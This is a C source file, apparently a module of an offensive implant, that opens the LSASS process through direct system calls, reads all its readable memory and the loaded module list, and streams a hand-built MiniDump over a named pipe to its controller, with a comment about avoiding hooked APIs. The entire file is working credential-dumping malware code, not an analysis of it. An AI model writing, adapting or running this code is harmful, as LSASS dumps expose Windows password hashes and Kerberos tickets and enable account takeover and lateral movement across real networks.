/**
 * LSASS memory dump — reads process memory and streams as MiniDump format.
 *
 * Builds a valid MDMP file in memory with:
 * - Header
 * - SystemInfo stream
 * - ModuleList stream (from PEB)
 * - Memory64List stream (all readable regions)
 *
 * Streams directly to named pipe — never holds the full dump in memory.
 */

#include <windows.h>
#include "../include/ntdefs.h"
#include "../include/syscalls.h"
#include "../include/agent.h"

#pragma pack(push, 1)

typedef struct _MDMP_HEADER {
    DWORD Signature;
    WORD  Version;
    WORD  ImplementationVersion;
    DWORD NumberOfStreams;
    DWORD StreamDirectoryRva;
    DWORD CheckSum;
    DWORD TimeDateStamp;
    ULONG64 Flags;
} MDMP_HEADER;

typedef struct _MDMP_DIRECTORY {
    DWORD StreamType;
    DWORD DataSize;
    DWORD Rva;
} MDMP_DIRECTORY;

typedef struct _MDMP_SYSTEM_INFO {
    WORD  ProcessorArchitecture;
    WORD  ProcessorLevel;
    WORD  ProcessorRevision;
    BYTE  NumberOfProcessors;
    BYTE  ProductType;
    DWORD MajorVersion;
    DWORD MinorVersion;
    DWORD BuildNumber;
    DWORD PlatformId;
    DWORD CSDVersionRva;
    WORD  SuiteMask;
    WORD  Reserved2;
    // CPU info follows (varies by arch, we zero-fill)
    BYTE  CpuInfo[24];
} MDMP_SYSTEM_INFO;

typedef struct _MDMP_MEMORY_DESCRIPTOR64 {
    ULONG64 StartOfMemoryRange;
    ULONG64 DataSize;
} MDMP_MEMORY_DESCRIPTOR64;

typedef struct _MDMP_MEMORY64_LIST_HEADER {
    ULONG64 NumberOfMemoryRanges;
    ULONG64 BaseRva;  // RVA where memory data starts
} MDMP_MEMORY64_LIST_HEADER;

#pragma pack(pop)

// Module info from PEB walk
typedef struct _MODULE_INFO {
    PVOID  base;
    DWORD  size;
    DWORD  timestamp;
    WCHAR  name[260];
    DWORD  name_len;  // bytes (including null)
} MODULE_INFO;

#define MAX_MODULES 256

static DWORD enumerate_modules(HANDLE process, MODULE_INFO *modules, DWORD max_modules) {
    DWORD count = 0;
    PROCESS_BASIC_INFORMATION pbi = {0};
    SIZE_T ret_len;

    // Get PEB address
    NTSTATUS status = sys_NtQueryInformationProcess(
        process, ProcessBasicInformation, &pbi, sizeof(pbi), (PULONG)&ret_len
    );
    if (status != 0 || !pbi.PebBaseAddress) return 0;

    // Read PEB to get Ldr
    PEB peb = {0};
    status = sys_NtReadVirtualMemory(process, pbi.PebBaseAddress, &peb, sizeof(peb), &ret_len);
    if (status != 0 || !peb.Ldr) return 0;

    // Read PEB_LDR_DATA
    PEB_LDR_DATA ldr = {0};
    status = sys_NtReadVirtualMemory(process, peb.Ldr, &ldr, sizeof(ldr), &ret_len);
    if (status != 0) return 0;

    // Walk InMemoryOrderModuleList
    PVOID list_head = (BYTE*)peb.Ldr + FIELD_OFFSET(PEB_LDR_DATA, InMemoryOrderModuleList);
    PVOID current_link = ldr.InMemoryOrderModuleList.Flink;

    while (current_link != list_head && count < max_modules) {
        // LDR_DATA_TABLE_ENTRY: InMemoryOrderLinks is at offset 0x10
        // So entry base = current_link - 0x10
        BYTE entry_buf[sizeof(LDR_DATA_TABLE_ENTRY)] = {0};
        PVOID entry_addr = (BYTE*)current_link - 0x10;

        status = sys_NtReadVirtualMemory(process, entry_addr, entry_buf, sizeof(LDR_DATA_TABLE_ENTRY), &ret_len);
        if (status != 0) break;

        LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)entry_buf;

        if (entry->DllBase && entry->SizeOfImage) {
            modules[count].base = entry->DllBase;
            modules[count].size = entry->SizeOfImage;
            modules[count].timestamp = entry->TimeDateStamp;
            modules[count].name_len = 0;

            // Read module name
            if (entry->FullDllName.Length && entry->FullDllName.Buffer) {
                DWORD name_bytes = entry->FullDllName.Length;
                if (name_bytes > sizeof(modules[count].name) - 2)
                    name_bytes = sizeof(modules[count].name) - 2;
                status = sys_NtReadVirtualMemory(process, entry->FullDllName.Buffer,
                    modules[count].name, name_bytes, &ret_len);
                if (status == 0) {
                    modules[count].name_len = name_bytes;
                    modules[count].name[name_bytes / 2] = 0;
                }
            }
            count++;
        }

        current_link = entry->InMemoryOrderLinks.Flink;
    }

    return count;
}

// Collect all readable memory regions from a process
typedef struct _REGION_INFO {
    PVOID  base;
    SIZE_T size;
} REGION_INFO;

#define MAX_REGIONS 4096

static DWORD enumerate_regions(HANDLE process, REGION_INFO *regions, DWORD max_regions) {
    DWORD count = 0;
    PVOID addr = NULL;
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T ret_len;

    while (count < max_regions) {
        NTSTATUS status = sys_NtQueryVirtualMemory(
            process, addr, MemoryBasicInformation,
            &mbi, sizeof(mbi), &ret_len
        );

        if (status != 0) break;

        // Only include committed, readable regions
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ |
                           PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) &&
            !(mbi.Protect & PAGE_GUARD)) {
            regions[count].base = mbi.BaseAddress;
            regions[count].size = mbi.RegionSize;
            count++;
        }

        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
        if ((ULONG_PTR)addr < (ULONG_PTR)mbi.BaseAddress) break;  // overflow
    }

    return count;
}

BOOL dump_lsass(DWORD pid, HANDLE pipe) {
    HANDLE process = NULL;
    OBJECT_ATTRIBUTES oa = {sizeof(oa), 0};
    CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

    // Open LSASS with full read access
    NTSTATUS status = sys_NtOpenProcess(
        &process,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        &oa,
        &cid
    );

    if (status != 0 || !process) {
        write_pipe(pipe, "ERR:", 4);
        write_pipe(pipe, &status, 4);
        return FALSE;
    }

    // Enumerate memory regions
    REGION_INFO *regions = (REGION_INFO *)VirtualAlloc(
        NULL, sizeof(REGION_INFO) * MAX_REGIONS, MEM_COMMIT, PAGE_READWRITE
    );
    if (!regions) {
        sys_NtClose(process);
        return FALSE;
    }

    DWORD region_count = enumerate_regions(process, regions, MAX_REGIONS);
    if (region_count == 0) {
        VirtualFree(regions, 0, MEM_RELEASE);
        sys_NtClose(process);
        return FALSE;
    }

    // Enumerate modules from PEB
    MODULE_INFO *modules = (MODULE_INFO *)VirtualAlloc(
        NULL, sizeof(MODULE_INFO) * MAX_MODULES, MEM_COMMIT, PAGE_READWRITE
    );
    DWORD module_count = 0;
    if (modules) {
        module_count = enumerate_modules(process, modules, MAX_MODULES);
    }

    // Calculate layout — 3 streams: SystemInfo + ModuleList + Memory64List
    DWORD num_streams = module_count > 0 ? 3 : 2;
    DWORD header_size = sizeof(MDMP_HEADER);
    DWORD dir_size = sizeof(MDMP_DIRECTORY) * num_streams;
    DWORD sysinfo_size = sizeof(MDMP_SYSTEM_INFO);

    // Module list: 4 (count) + 108*N (module entries) + name strings
    DWORD module_list_size = 0;
    DWORD module_names_size = 0;
    if (module_count > 0) {
        module_list_size = 4 + 108 * module_count;
        for (DWORD i = 0; i < module_count; i++) {
            module_names_size += 4 + modules[i].name_len + 2;  // MINIDUMP_STRING: len(4) + data + padding
            if ((modules[i].name_len + 2) % 4 != 0)
                module_names_size += 4 - ((modules[i].name_len + 2) % 4);
        }
    }

    DWORD mem64_header_size = sizeof(MDMP_MEMORY64_LIST_HEADER) +
                              sizeof(MDMP_MEMORY_DESCRIPTOR64) * region_count;

    DWORD sysinfo_rva = header_size + dir_size;
    DWORD modlist_rva = sysinfo_rva + sysinfo_size;
    DWORD modnames_rva = modlist_rva + module_list_size;
    DWORD mem64_rva = modnames_rva + module_names_size;
    DWORD data_rva = mem64_rva + mem64_header_size;

    // Build and write header
    MDMP_HEADER hdr = {0};
    hdr.Signature = MDMP_SIGNATURE;
    hdr.Version = MDMP_VERSION;
    hdr.ImplementationVersion = 0;
    hdr.NumberOfStreams = num_streams;
    hdr.StreamDirectoryRva = header_size;
    hdr.CheckSum = 0;
    hdr.TimeDateStamp = (DWORD)__rdtsc();  // pseudo-timestamp
    hdr.Flags = 0x00000002;  // MiniDumpWithFullMemory

    write_pipe(pipe, &hdr, sizeof(hdr));

    // Stream directory
    MDMP_DIRECTORY dirs[3];
    DWORD di = 0;
    dirs[di].StreamType = STREAM_SYSTEM_INFO;
    dirs[di].DataSize = sysinfo_size;
    dirs[di].Rva = sysinfo_rva;
    di++;
    if (module_count > 0) {
        dirs[di].StreamType = STREAM_MODULE_LIST;
        dirs[di].DataSize = module_list_size + module_names_size;
        dirs[di].Rva = modlist_rva;
        di++;
    }
    dirs[di].StreamType = STREAM_MEMORY64_LIST;
    dirs[di].DataSize = mem64_header_size;
    dirs[di].Rva = mem64_rva;
    di++;

    write_pipe(pipe, dirs, sizeof(MDMP_DIRECTORY) * num_streams);

    // SystemInfo stream
    MDMP_SYSTEM_INFO sysinfo = {0};
    sysinfo.ProcessorArchitecture = 9;  // AMD64
    sysinfo.NumberOfProcessors = 1;
    sysinfo.MajorVersion = 10;
    sysinfo.MinorVersion = 0;
    sysinfo.BuildNumber = 0;  // Will be filled by Python parser if needed
    sysinfo.PlatformId = 2;   // VER_PLATFORM_WIN32_NT

    // Get actual version info from PEB
    OSVERSIONINFOW vi = {sizeof(vi)};
    // Use RtlGetVersion if available (not hooked)
    typedef NTSTATUS (WINAPI *RtlGetVersion_t)(POSVERSIONINFOW);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        RtlGetVersion_t pRtlGetVersion = (RtlGetVersion_t)GetProcAddress(ntdll, "RtlGetVersion");
        if (pRtlGetVersion) {
            pRtlGetVersion(&vi);
            sysinfo.MajorVersion = vi.dwMajorVersion;
            sysinfo.MinorVersion = vi.dwMinorVersion;
            sysinfo.BuildNumber = vi.dwBuildNumber;
        }
    }

    write_pipe(pipe, &sysinfo, sizeof(sysinfo));

    // ModuleList stream
    if (module_count > 0) {
        // NumberOfModules
        write_pipe(pipe, &module_count, 4);

        // Calculate name RVAs (names follow after all module entries)
        DWORD name_rva_cursor = modnames_rva;

        // Write MINIDUMP_MODULE entries (108 bytes each)
        for (DWORD i = 0; i < module_count; i++) {
            BYTE mod_entry[108] = {0};
            *(ULONG64 *)&mod_entry[0] = (ULONG64)(ULONG_PTR)modules[i].base;  // BaseOfImage
            *(DWORD *)&mod_entry[8] = modules[i].size;      // SizeOfImage
            *(DWORD *)&mod_entry[12] = 0;                   // CheckSum
            *(DWORD *)&mod_entry[16] = modules[i].timestamp; // TimeDateStamp
            *(DWORD *)&mod_entry[20] = name_rva_cursor;     // ModuleNameRva
            write_pipe(pipe, mod_entry, 108);

            // Advance name RVA for next module
            DWORD str_size = 4 + modules[i].name_len + 2;
            if ((modules[i].name_len + 2) % 4 != 0)
                str_size += 4 - ((modules[i].name_len + 2) % 4);
            name_rva_cursor += str_size;
        }

        // Write module name strings (MINIDUMP_STRING format)
        for (DWORD i = 0; i < module_count; i++) {
            DWORD byte_count = modules[i].name_len;
            write_pipe(pipe, &byte_count, 4);
            write_pipe(pipe, modules[i].name, byte_count);
            // Null terminator + padding
            BYTE pad[6] = {0};
            DWORD pad_len = 2;  // null terminator
            if ((byte_count + 2) % 4 != 0)
                pad_len += 4 - ((byte_count + 2) % 4);
            write_pipe(pipe, pad, pad_len);
        }
    }

    // Memory64List header
    MDMP_MEMORY64_LIST_HEADER mem64hdr = {0};
    mem64hdr.NumberOfMemoryRanges = region_count;
    mem64hdr.BaseRva = data_rva;
    write_pipe(pipe, &mem64hdr, sizeof(mem64hdr));

    // Memory64 descriptors
    for (DWORD i = 0; i < region_count; i++) {
        MDMP_MEMORY_DESCRIPTOR64 desc;
        desc.StartOfMemoryRange = (ULONG64)(ULONG_PTR)regions[i].base;
        desc.DataSize = regions[i].size;
        write_pipe(pipe, &desc, sizeof(desc));
    }

    // Memory data — read and stream each region
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, 65536, MEM_COMMIT, PAGE_READWRITE);

    for (DWORD i = 0; i < region_count; i++) {
        SIZE_T remaining = regions[i].size;
        PVOID addr = regions[i].base;

        while (remaining > 0) {
            SIZE_T to_read = remaining > 65536 ? 65536 : remaining;
            SIZE_T bytes_read = 0;

            status = sys_NtReadVirtualMemory(process, addr, buf, to_read, &bytes_read);
            if (status != 0 || bytes_read == 0) {
                // Write zeros for unreadable regions
                RtlZeroMemory(buf, (SIZE_T)to_read);
                bytes_read = to_read;
            }

            write_pipe(pipe, buf, (DWORD)bytes_read);
            addr = (BYTE *)addr + bytes_read;
            remaining -= bytes_read;
        }
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    VirtualFree(regions, 0, MEM_RELEASE);
    if (modules) VirtualFree(modules, 0, MEM_RELEASE);
    sys_NtClose(process);

    return TRUE;
}
